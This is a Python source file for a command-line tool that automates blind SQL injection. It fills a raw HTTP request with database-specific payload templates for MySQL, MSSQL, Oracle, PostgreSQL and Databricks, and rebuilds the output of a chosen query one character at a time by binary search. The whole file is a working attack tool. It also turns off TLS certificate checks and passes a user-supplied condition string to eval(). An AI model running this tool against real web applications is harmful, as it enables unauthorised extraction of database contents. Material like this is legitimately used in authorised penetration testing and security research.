from requests import Request, Response, Session, PreparedRequest
from typing import Literal
import time
import math
from abc import ABC, abstractmethod
import urllib.parse
import urllib3
import argparse
from http.server import BaseHTTPRequestHandler
from io import BytesIO

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class HTTPRequest(BaseHTTPRequestHandler):
    ''' Used for parsing raw HTTP requests '''

    def __init__(self, request_text):
        self.rfile = BytesIO(request_text)
        self.raw_requestline = self.rfile.readline()
        self.error_code = self.error_message = None
        self.parse_request()

    def send_error(self, code, message):
        self.error_code = code
        self.error_message = message

CHAR_MIN = 0x20
CHAR_MAX = 0x7E
SAFE_CHARS = '/'
INITIAL_LENGTH = 16
INITIAL_CHAR = ord('Z')

POSTGRESQL_PAYLOADS = { # avoids <, > and quotes
    'length': {
        '>': 'SIGN(LENGTH(({query}))-{{guess}})=1',
        '=': 'LENGTH(({query}))={{guess}}'
    },
    'character': {
        '>': 'SIGN(ASCII(SUBSTRING(({query}),{index},1))-{{guess}})=1',
        '=': 'SUBSTRING(({query}),{index},1)=CHR({{guess}})'
    },
    'compare': '({query})=$${guess}$$'
}

MYSQL_PAYLOADS = {
    'length': {
        '>': 'LENGTH(({query}))>{{guess}}',
        '=': 'LENGTH(({query}))={{guess}}'
    },
    'character': {
        '>': 'SUBSTRING(({query}),{index},1)>CHR({{guess}})',
        '=': 'SUBSTRING(({query}),{index},1)=CHR({{guess}})'
    },
    'compare': 'STRCMP(({query}),{{guess}})'
}

MSSQL_PAYLOADS = {
    'length': {
        '>': 'LEN(({query}))>{{guess}}',
        '=': 'LEN(({query}))={{guess}}'
    },
    'character': {
        '>': 'SUBSTRING(({query}),{index},1)>CHR({{guess}})',
        '=': 'SUBSTRING(({query}),{index},1)=CHR({{guess}})'
    },
    'compare': '({query})=\'{{guess}}\''
}

ORACLE_PAYLOADS = {
    'length': {
        '>': 'LENGTH(({query}))>{{guess}}',
        '=': 'LENGTH(({query}))={{guess}}'
    },
    'character': {
        '>': 'SUBSTR(({query}),{index},1)>CHR({{guess}})',
        '=': 'SUBSTR(({query}),{index},1)=CHR({{guess}})'
    },
    'compare': '({query})=\'{{guess}}\''
}

DATABRICKS_PAYLOADS = {
    'length': {
        '>': 'length(({query}))>{{guess}}',
        '=': 'length(({query}))={{guess}}'
    },
    'character': {
        '>': 'substr(({query}),{index},1)>CHR({{guess}})',
        '=': 'substr(({query}),{index},1)=CHR({{guess}})'
    },
    'compare': '({query})=\'{{guess}}\''
}

PROFILES = {
    'mysql': MYSQL_PAYLOADS,
    'mssql': MSSQL_PAYLOADS,
    'oracle': ORACLE_PAYLOADS,
    'postgresql': POSTGRESQL_PAYLOADS,
    'databricks': DATABRICKS_PAYLOADS
}

class SqlGrab:
    def __init__(
            self,
            host: str,
            request: str,
            dbms: Literal['mysql', 'mssql', 'oracle', 'postgresql', 'databricks'],
            condition: str,
            delay: float,
            urlencode: bool,
            sanity: bool,
            proxy: str | None = None
        ):
        self.urlencode = urlencode
        self.sanity = sanity
        self.delay = delay
        self.payloadSets = PROFILES[dbms]
        self.condition = condition
        self.proxy = {
            'http': proxy,
            'https': proxy
        } if proxy else {}
        self.request = self.parseRequest(host, request)

    def grab(self, query: str) -> str:
        print(f'[+] Grabbing: \'{query}\'')
        self.session = Session()
        grabber = SqlGrab.Grabber(parent=self, query=query)
        try:
            # could add parallelism here
            return grabber.grab()
        except RuntimeError as e:
            print('\n'+str(e))
            exit()
        except KeyboardInterrupt:
            print('\n[!] Interrupted')

    class Grabber:
        def __init__(self, parent: 'SqlGrab', query: str):
            self.parent = parent
            self.query = query
            self.result = ''
            self.status = '[+] Initialising...'

        def grab(self) -> str:
            self.length = self.getLength()
            return self.getString()
        
        def update(self) -> None:
            print(self.status.format(**self.__dict__), end='\r')

        # by the time this function is called, the payload string should only require 1 sub
        def getValue(self, guess: int, bigger: str, equal: str, range=(0, math.inf) ):
            ''' Determines the value of a variable based on iterative halving/doubling of the search space '''
            self.min, self.max = range

            while self.min != self.max:
                is_bigger = self.parent.evaluate(bigger.format(guess=guess))
                if is_bigger:
                    self.min = guess + 1
                else:
                    self.max = guess

                if self.max == math.inf: # double value to find upper bound if not already found
                    guess *= 2
                else: # narrow down between that range
                    guess = self.min + int((self.max - self.min) / 2)
                if guess > 2**32:
                    raise RuntimeError('[!] An upper bound on the output length could not be found. Maybe a syntax error?')
                
                self.update()
                time.sleep(self.parent.delay)

            # sanity check - this slows us down
            if self.parent.sanity:
                is_equal = self.parent.evaluate(equal.format(guess=guess))
                if not is_equal:
                    raise RuntimeError('[!] The result was invalid, either due to a syntax error or because no result exists. Send the requests to Repeater and sanity check them.')

            return guess

        def getLength(self):
            ''' Determines the length of the query response '''
            self.status = 'Determining length... (\x1B[90mBetween {min} and {max}\x1B[0m\x1B[0m)\033[K'

            # populate all values in the payload string other than the 'guess' value
            payloads = self.parent.payloadSets['length']
            bigger = payloads['>'].format(query=self.query)
            equal = payloads['='].format(query=self.query)

            return self.getValue(INITIAL_LENGTH, bigger, equal)

        def getString(self) -> str:
            ''' Determines the value of each character in a [length]-long string '''
            self.status = '[\x1b[90m{current}/{length}: Between \'{min:c}\' and \'{max:c}\'\x1b[0m] \x1b[32m{result}\x1b[0m\033[K'
            payloads = self.parent.payloadSets['character']

            for self.current in range(1, self.length + 1):
                # populate all values in the payload string other than the 'guess' value
                bigger = payloads['>'].format(query=self.query, index=self.current)
                equal = payloads['='].format(query=self.query, index=self.current)
                self.result += chr(
                    self.getValue(INITIAL_CHAR, bigger, equal, range=(CHAR_MIN, CHAR_MAX))
                )
                self.update()
            
            # sanity check
            compare = self.parent.payloadSets['compare'].format(
                query=self.query,
                guess=self.result
            )
            if not self.parent.evaluate(compare):
                raise RuntimeError('[!] The result was invalid, either due to a syntax error or because no result exists. Send the requests to Repeater and sanity check them.')
            print()
            return self.result

    @staticmethod
    def urlEncode(text: str) -> str:
        return urllib.parse.quote_plus(text, safe=SAFE_CHARS)

    def isMatch(self, response):
        ''' Takes a conditional statement from command line arguments and determines the truth value of the query based on it. '''
        return eval(self.condition, locals())
    
    def evaluate(self, payload) -> bool:
        ''' Issues a request and determines truth value of the query based on the response '''
        prepared: PreparedRequest = self.request.prepare()

        # Default to keepalive for speed increase
        prepared.headers['Connection'] = 'keep-alive'

        # perform URL {payload} tag subsitution
        prepared.url = prepared.url.replace(
            '%7Bpayload%7D',
            self.urlEncode(payload)  # URL payload will always be urlencoded
        )

        # perform body {payload} tag subsitution
        if prepared.body:
            if self.urlencode:
                payload = self.urlEncode(payload)
            body = prepared.body.decode('utf-8')
            body = body.replace("{payload}", payload)
            prepared.body = body.encode('utf-8')
            prepared.headers['Content-Length'] = str(len(prepared.body))

        prepared.headers = dict([
            (k, v.format(payload=payload))
            for k, v in prepared.headers.items()
        ])

        response = self.session.send(
            prepared,
            proxies =self.proxy,
            verify=False
        )
    
        return self.isMatch(response)

    def parseRequest(self, hostname: str, filename: str) -> Request:
        ''' Parses a raw HTTP request from file and verifies it contains at least one {payload} tag. Creates a HTTPRequest from the parsed content. '''
        with open(filename, 'rb') as fp:
            parser = HTTPRequest(fp.read())
            locations = []
            if parser.error_code:
                raise RuntimeError(
                    f'Error parsing request file: {parser.error_message}')

            target = '{uri.scheme}://{uri.netloc}'.format(uri=urllib.parse.urlparse(hostname))
            self.url = f'{target}{parser.path}'

            request = Request(
                method=parser.command,
                url=self.url,
                headers=parser.headers,
                data=parser.rfile.read(),
            )

            # scan the parsed request for payload tags before preparing it
            tag = '{payload}'
            if tag in request.url:
                locations.append('url')
            if request.data and tag in str(request.data):
                locations.append('body')
            for key, value in request.headers._headers:
                if tag in key:
                    locations.append(f'{key} header key')
                if tag in value:
                    locations.append(f'{key} header value')

            if not locations:
                raise Exception(
                    '[!] The parsed request file does not contain a \'{payload}\' tag. Add the string \'{payload}\' within the request file at the injection point.')

            print(f'[+] Target: {target}, Payload location(s): {", ".join(locations)}')
            return request

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='Extracts string data from a conditional SQLi vulnerability using a binary search tree approach.',
        epilog='Note: the program will assume something is broken if responses indicate the output is larger than 2^32 bytes (~4GB)'
    )
    parser.add_argument('-u', '--host', required=True, help='Host URL, including protocol scheme and optionally port. E.g. https://target.com:80')
    parser.add_argument('-r', '--request', required=True, help='Request file containing one or more \'{payload}\' tags')
    parser.add_argument('-q', '--query', required=True, help='SQL query to extract the response of. Must return a single string, e.g. @@version, SELECT user FROM dual')
    parser.add_argument('-d', '--dbms', required=True, choices=PROFILES.keys())
    parser.add_argument('-c', '--condition', required=True, help='Python expression to evaluate to determine true/false from the response. E.g. \'"error" in response.text\', \'response.status_code == 401\', \'len(response.content) > 1433\', \'response.elapsed.total_seconds() > 2\'')
    parser.add_argument('--delay', required=False, default=0, type=float, help='Delay in seconds to add between requests. Optional. E.g. 1, 0.2')
    parser.add_argument('--urlencode', required=False, action='store_true', help='Perform URL-encoding on the payloads.')
    parser.add_argument('--sanity', required=False, action='store_true', help='Sanity check inferred results. Useful to help catch inconsistent results.')
    parser.add_argument('--proxy', required=False, help='Proxy to use, e.g. http://127.0.0.1:8080')

    args = vars(parser.parse_args())
    q = args.pop('query')
    grabber = SqlGrab(
        **args
    )
    result = grabber.grab(q)
    print(f'\n{result}\n')
